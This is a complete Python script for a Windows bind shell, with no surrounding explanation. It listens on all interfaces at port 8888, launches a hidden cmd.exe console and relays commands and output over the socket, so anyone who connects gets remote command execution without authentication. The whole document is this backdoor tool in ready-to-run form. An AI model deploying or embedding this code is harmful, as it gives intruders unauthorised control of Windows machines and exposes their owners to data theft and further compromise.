import os
import socket
import subprocess
import threading

def send_output(sock, proc):
    while True:
        data = proc.stdout.read(1)
        if data:
            sock.send(data)
        else:
            break

def receive_input(sock, proc):
    while True:
        data = sock.recv(1024)
        if data:
            proc.stdin.write(data)
            proc.stdin.flush()
        else:
            break

def main():
    HOST = '0.0.0.0'
    PORT = 8888

    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((HOST, PORT))
        s.listen(1)

        print(f"Listening on {HOST}:{PORT}...")

        try:
            conn, addr = s.accept()
            print(f"Connected to {addr[0]}:{addr[1]}")

            p = subprocess.Popen(["cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, creationflags=subprocess.CREATE_NO_WINDOW)

            send_thread = threading.Thread(target=send_output, args=[conn, p])
            send_thread.daemon = True
            send_thread.start()

            receive_thread = threading.Thread(target=receive_input, args=[conn, p])
            receive_thread.daemon = True
            receive_thread.start()

            try:
                while True:
                    pass
            except KeyboardInterrupt:
                print("KeyboardInterrupt: Waiting for new connections...")
                conn.close()
        except KeyboardInterrupt:
            print("KeyboardInterrupt: Waiting for new connections...")
            s.close()

if __name__ == "__main__":
    main()
